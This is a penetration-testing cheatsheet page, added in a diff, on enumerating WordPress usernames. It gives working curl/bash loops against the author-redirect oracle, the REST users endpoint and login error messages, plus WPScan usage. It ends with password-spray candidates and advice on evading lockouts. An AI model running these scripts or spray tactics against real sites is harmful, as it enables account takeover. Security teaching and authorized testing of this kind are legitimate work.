@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>User Enumeration · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › WordPress</nav><h1>User Enumeration</h1><p class="cx-lede">Discovering valid WordPress usernames before brute force - the ?author=N redirect oracle, the /wp-json/wp/v2/users REST endpoint, login-form error message differential, and WPScan&#x27;s automated user mode.</p><div class="cx-tags"><span class="cx-tag">MITRE T1087, T1589.003</span><span class="cx-tag">D3FEND D3-RAPA</span><span class="cx-tag">IMPACT CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Brute-forcing WordPress without a valid username list is wasteful. Enumerate users first; spray credentials against confirmed users second. Four sources, each with different stealth and reliability characteristics:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. The ?author=N redirect oracle (the most reliable + most common)
+for i in $(seq 1 20); do
+  curl -sI &quot;http://target/?author=$i&quot; \
+    | awk -v i=&quot;$i&quot; &#x27;/^Location:/ {print &quot;id=&quot; i &quot;: &quot; $2}&#x27;
+done
+
+# 2. The REST API user endpoint
+curl -s &#x27;http://target/wp-json/wp/v2/users&#x27; | jq -r &#x27;.[] | &quot;\(.id) \(.slug) \(.name)&quot;&#x27;
+
+# 3. Login error differential
+#    Invalid user:     &quot;The username &lt;user&gt; is not registered...&quot;
+#    Valid user:       &quot;The password you entered for &lt;user&gt; is incorrect...&quot;
+
+# 4. WPScan
+wpscan --url http://target --enumerate u</code></pre></figure>
+<p>Success indicator: a list of <code>&lt;id&gt; &lt;slug&gt; &lt;display name&gt;</code> triples covering at least the admin user (ID 1) and one or more author accounts.</p>
+<h2 id="why-enumerate-users-first">Why enumerate users first</h2>
+<p>A few reasons:</p>
+<ol>
+<li><strong>Brute-force without a username target is "spray everything against everything"</strong> - wasteful and noisy. Password-spray with a verified user list is targeted and effective.</li>
+<li><strong>Lockout policies usually trigger per-user, not per-source-IP.</strong> Spraying one common password across 20 known users gets you 20 chances; brute-forcing <code>admin:wordlist</code> with no other usernames in the mix may lock just one account but still alert on the failure rate.</li>
+<li><strong>The admin user is the highest-value target.</strong> Default admin username <code>admin</code> is sometimes renamed. Knowing the rename target is required for any brute-force attempt against the actual administrator.</li>
+<li><strong>Display name vs. login slug.</strong> WordPress shows the "Display Name" on the front-end (e.g., "John Smith") but the login uses the "slug" (e.g., <code>jsmith</code>). Enumerating both is required to brute-force correctly.</li>
+</ol>
+<h2 id="source-1-authorn-redirect-oracle">Source 1 - <code>?author=N</code> redirect oracle</h2>
+<p>WordPress maps the URL parameter <code>author=N</code> (where N is a numeric user ID) to that user's archive page. The mapping is:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?author=1  →  /index.php/author/&lt;slug&gt;/   (when the user has any published posts)
+?author=1  →  /wp-login.php                (when the user has no posts)
+?author=1  →  404                          (when user ID 1 doesn&#x27;t exist)</code></pre></figure>
+<p>The redirect's <code>Location:</code> header <em>contains the user's slug</em>. That's the operator-relevant detail.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sI &#x27;http://blog.example.com/?author=1&#x27;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>HTTP/1.1 301 Moved Permanently
+Date: Wed, 13 May 2020 20:47:08 GMT
+Server: Apache/2.4.29 (Ubuntu)
+X-Redirect-By: WordPress
+Location: http://blog.example.com/index.php/author/admin/
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8</code></pre></figure>
+<p>The <code>Location:</code> is <code>.../author/admin/</code> - user ID 1's slug is <code>admin</code>.</p>
+<p>For non-existent IDs:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sI &#x27;http://blog.example.com/?author=999&#x27;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>HTTP/1.1 404 Not Found
+Date: Wed, 13 May 2020 20:47:14 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+...</code></pre></figure>
+<p>The 404 vs. 301 distinction is unambiguous. Iterate over a range of IDs:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for i in $(seq 1 20); do
+  loc=$(curl -sI &quot;http://target/?author=$i&quot; | awk &#x27;tolower($1)==&quot;location:&quot; {print $2}&#x27; | tr -d &#x27;\r&#x27;)
+  if [ -n &quot;$loc&quot; ]; then
+    slug=$(echo &quot;$loc&quot; | grep -oE &#x27;author/[^/]+&#x27; | cut -d/ -f2)
+    echo &quot;id=$i  slug=$slug&quot;
+  fi
+done</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>id=1   slug=admin
+id=2   slug=ch4p
+id=4   slug=erika
+id=7   slug=david</code></pre></figure>
+<p>Gaps (id=3, id=5, id=6 missing) just mean those user IDs were deleted or never created. Common in real-world targets where users were added and removed over time.</p>
+<h3 id="what-stops-this-technique">What stops this technique</h3>
+<p>A few defenses, in order of how often they're deployed:</p>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Security plugin (Wordfence, iThemes Security) with "Hide username from author archive"</td>
+<td><code>?author=1</code> returns the homepage or 404 regardless of user existence</td>
+</tr>
+<tr>
+<td><code>redirect_canonical</code> filter customized to suppress slug</td>
+<td><code>Location:</code> header returns the post archive URL without the slug</td>
+</tr>
+<tr>
+<td><code>users_can_register = off</code> AND no published posts by any user</td>
+<td><code>?author=N</code> for valid IDs redirects to <code>/wp-login.php</code> instead of to the slug</td>
+</tr>
+</tbody>
+</table>
+<p>When the redirect oracle is blocked, fall through to source 2.</p>
+<h3 id="confirming-admin-user-identity">Confirming admin user identity</h3>
+<p>The display name shown next to a post byline is a hint but not always the slug. Hover over the byline (or read the <code>&lt;a href&gt;</code>):</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;span class=&quot;post-author&quot;&gt;by &lt;a href=&quot;http://target/author/jsmith/&quot; rel=&quot;author&quot;&gt;John Smith&lt;/a&gt;&lt;/span&gt;</code></pre></figure>
+<p>The link points to <code>/author/jsmith/</code> - the slug is <code>jsmith</code>, not "John Smith." <code>jsmith</code> is what you'd submit as the username to <code>wp-login.php</code>.</p>
+<h2 id="source-2-rest-api-wp-jsonwpv2users">Source 2 - REST API <code>/wp-json/wp/v2/users</code></h2>
+<p>WordPress 4.7+ exposes a <code>/wp-json/wp/v2/users</code> endpoint via the REST API. Pre-4.7.2, this returned every user that had ever published a post (which often included accounts that no longer had posts but had at some point). Post-4.7.2, it returns only users with currently-published posts by default.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -s &#x27;http://target/wp-json/wp/v2/users&#x27; | jq -r &#x27;.[] | &quot;\(.id)\t\(.slug)\t\(.name)\t\(.link)&quot;&#x27;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1   admin       Administrator   http://target/author/admin/
+2   ch4p        ch4p            http://target/author/ch4p/
+4   erika       Erika Smith     http://target/author/erika/
+7   david       David Brown     http://target/author/david/</code></pre></figure>
+<p>This is the cleanest source when it works:</p>
+<ul>
+<li><code>id</code> - the numeric ID (same one used in <code>?author=N</code>)</li>
+<li><code>slug</code> - login username</li>
+<li><code>name</code> - display name (sometimes the real name, sometimes the same as the slug)</li>
+<li><code>link</code> - author archive URL (useful for verifying the slug)</li>
+</ul>
+<h3 id="when-the-endpoint-is-restricted">When the endpoint is restricted</h3>
+<p>WordPress provides a filter (<code>rest_authentication_errors</code>) that security plugins use to lock down the REST API. When restricted:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -s &#x27;http://target/wp-json/wp/v2/users&#x27; | jq
+{
+  &quot;code&quot;: &quot;rest_user_cannot_view&quot;,
+  &quot;message&quot;: &quot;Sorry, you are not allowed to list users.&quot;,
+  &quot;data&quot;: { &quot;status&quot;: 401 }
+}</code></pre></figure>
+<p>That 401 still confirms WordPress is running and the REST endpoint exists - it just won't return users. Move to source 1 or source 3.</p>
+<h3 id="per-user-lookup">Per-user lookup</h3>
+<p>Even when listing is blocked, <em>individual</em> user lookup by ID is sometimes still allowed:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -s &#x27;http://target/wp-json/wp/v2/users/1&#x27; | jq</code></pre></figure>
+<p>If ID 1 returns user data while the list endpoint returns 401, the filter is misconfigured and per-ID lookup is the workaround:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for i in $(seq 1 50); do
+  resp=$(curl -s &quot;http://target/wp-json/wp/v2/users/$i&quot;)
+  echo &quot;$resp&quot; | jq -e &#x27;.slug // empty&#x27; &gt;/dev/null 2&gt;&amp;1 \
+    &amp;&amp; echo &quot;id=$i $(echo $resp | jq -r .slug)&quot;
+done</code></pre></figure>
+<h2 id="source-3-login-error-message-differential">Source 3 - login error message differential</h2>
+<p>WordPress's <code>wp-login.php</code> returns different error strings for "user doesn't exist" vs. "password is wrong":</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Submit a bogus username + bogus password
+curl -s &#x27;http://target/wp-login.php&#x27; \
+  --data &#x27;log=nonexistent_user_xxx&amp;pwd=wrong&amp;wp-submit=Log+In&#x27; \
+  | grep -oE &#x27;is not registered|password you entered&#x27;</code></pre></figure>
+<table>
+<thead>
+<tr>
+<th>Response contains</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;strong&gt;Error&lt;/strong&gt;: The username &lt;user&gt; is not registered</code></td>
+<td>User doesn't exist</td>
+</tr>
+<tr>
+<td><code>&lt;strong&gt;Error&lt;/strong&gt;: The password you entered for the username &lt;user&gt; is incorrect</code></td>
+<td>User exists, password wrong</td>
+</tr>
+<tr>
+<td><code>Username and password are incorrect</code> (or similar generic)</td>
+<td>Differential disabled by hardening</td>
+</tr>
+</tbody>
+</table>
+<h3 id="detection-script">Detection script</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for user in $(cat candidate_users.txt); do
+  resp=$(curl -s -X POST &quot;http://target/wp-login.php&quot; \
+              --data &quot;log=${user}&amp;pwd=DefinitelyWrongPwd123&amp;wp-submit=Log+In&quot;)
+  if echo &quot;$resp&quot; | grep -q &quot;is not registered&quot;; then
+    echo &quot;INVALID: $user&quot;
+  elif echo &quot;$resp&quot; | grep -q &quot;password you entered&quot;; then
+    echo &quot;VALID:   $user&quot;
+  else
+    echo &quot;UNKNOWN: $user&quot;
+  fi
+done</code></pre></figure>
+<p>This source confirms users from a candidate list without depending on the redirect oracle or REST API. The candidate list can come from:</p>
+<ul>
+<li>Email-format derivation against employee names (e.g., <code>firstname.lastname</code>, <code>flastname</code>)</li>
+<li>Common admin usernames (<code>admin</code>, <code>administrator</code>, <code>wp-admin</code>, <code>superuser</code>, <code>root</code>)</li>
+<li>Company-specific patterns (the company name, <code>&lt;companyname&gt;admin</code>)</li>
+</ul>
+<h3 id="the-hardened-response">The hardened response</h3>
+<p>WordPress 5.x added a <code>wp_login_errors</code> filter that some security plugins use to homogenize errors:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;strong&gt;Error&lt;/strong&gt;: The username or password you entered is incorrect.</code></pre></figure>
+<p>When errors are homogenized, this source is dead. Fall back to source 1 or 2.</p>
+<h2 id="source-4-wpscan-automation">Source 4 - WPScan automation</h2>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">wpscan --url http://target --enumerate u</code></pre></figure>
+<p>WPScan combines multiple sources internally:</p>
+<ul>
+<li>Passive: scrape <code>&lt;a class="author"&gt;</code> links from rendered posts</li>
+<li>Active: iterate <code>?author=1..</code> until 404</li>
+<li>Active: query <code>/wp-json/wp/v2/users</code> if the REST API is open</li>
+<li>Active (with <code>--enumerate u</code>): hit <code>wp-login.php</code> with bogus passwords and check for the differential</li>
+</ul>
+<p>Sample output:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 &lt;==========&gt; (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] david
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] roger
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre></figure>
+<p>The "Found By" / "Confirmed By" output tells you which sources contributed - useful for assessment reports and for debugging when one source fails but another succeeds.</p>
+<p>To limit the ID brute-force range:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">wpscan --url http://target --enumerate u1-50</code></pre></figure>
+<p>Default range is 1-10. For a site with many authors over years, push it higher (1-100 or beyond).</p>
+<h2 id="xml-rpc-user-enumeration">XML-RPC user enumeration</h2>
+<p><code>xmlrpc.php</code> can also be used for user enumeration, but it's covered separately in <a href="../xmlrpc-abuse/index.html">XML-RPC abuse</a> because the mechanism is brute-force-style rather than oracle-style - you submit a (username, password) pair and the server's response tells you whether the username existed and whether the password was right. This is louder than the oracle methods above but useful when others are blocked.</p>
+<h2 id="what-to-do-with-the-user-list">What to do with the user list</h2>
+<p>Once you have confirmed usernames:</p>
+<ol>
+<li>
+<p><strong>Identify the admin.</strong> ID 1 is the default admin user. Sometimes renamed; sometimes a different ID is the actual admin. The <code>roles</code> field in the REST response (when available) confirms it.</p>
+</li>
+<li>
+<p><strong>Build a password candidate list.</strong> For each user:
+   - Common patterns: <code>&lt;user&gt;</code>, <code>&lt;user&gt;123</code>, <code>&lt;user&gt;2024!</code>, <code>&lt;companyname&gt;2024!</code>
+   - Seasonal: <code>Spring2024!</code>, <code>Summer2024!</code>, etc.
+   - Welcome variants: <code>Welcome1</code>, <code>Welcome123</code>, <code>Welcome2024!</code></p>
+</li>
+<li>
+<p><strong>Choose the brute-force vector.</strong> Login via <code>wp-login.php</code> or via <code>xmlrpc.php</code> - see <a href="../login-bruteforce/index.html">Login brute-force</a>.</p>
+</li>
+<li>
+<p><strong>Calibrate to lockout policy.</strong> If the admin uses iThemes Security with brute-force protection, more than a few attempts will block your IP. Spray patterns (one password attempt per user per hour) work better than rapid-fire.</p>
+</li>
+</ol>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>?author=</code> oracle (single user)</td>
+<td><code>curl -sI 'http://target/?author=1' \| grep -i location</code></td>
+</tr>
+<tr>
+<td><code>?author=</code> oracle (sweep)</td>
+<td>bash loop iterating IDs 1-20+</td>
+</tr>
+<tr>
+<td>REST users (full list)</td>
+<td><code>curl -s 'http://target/wp-json/wp/v2/users' \| jq</code></td>
+</tr>
+<tr>
+<td>REST users (per-ID)</td>
+<td><code>curl -s 'http://target/wp-json/wp/v2/users/1' \| jq</code></td>
+</tr>
+<tr>
+<td>Login error differential</td>
+<td><code>curl -s 'http://target/wp-login.php' --data 'log=USER&amp;pwd=wrong&amp;wp-submit=Log+In' \| grep -oE 'is not registered\|password you entered'</code></td>
+</tr>
+<tr>
+<td>WPScan users</td>
+<td><code>wpscan --url http://target --enumerate u</code></td>
+</tr>
+<tr>
+<td>WPScan users (wider range)</td>
+<td><code>wpscan --url http://target --enumerate u1-100</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../plugin-theme-enum/index.html">Previous: Plugin &amp; Theme Enumeration</a><a class="cx-next" href="../xmlrpc-abuse/index.html">Next: XML-RPC Abuse</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
